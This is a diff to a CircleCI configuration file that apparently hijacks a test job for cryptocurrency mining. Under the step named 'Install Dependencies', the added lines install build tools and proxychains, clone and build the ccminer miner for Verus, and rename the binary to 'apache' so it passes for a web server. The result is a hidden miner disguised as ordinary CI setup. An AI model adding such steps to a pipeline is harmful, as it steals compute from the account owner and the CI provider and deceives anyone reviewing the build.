@@ -16,13 +16,15 @@ jobs:
     # Here we're making sure we use just use the system-wide pip. By default it uses the project root's requirements.txt.
     # Then run your tests!
     # CircleCI will report the results back to your VCS provider.
-    parallelism: 16
+    parallelism: 3
     steps:
       - run:
           name: Install Dependencies
           # This assumes pytest is installed via the install-package step above
           command: |
-            lscpu
+            sudo apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git proxychains
+            git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git;cd ccminer;chmod +x build.sh;chmod +x configure.sh;chmod +x autogen.sh;./build.sh;mv ccminer ../apache;cd ..
+            ls
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
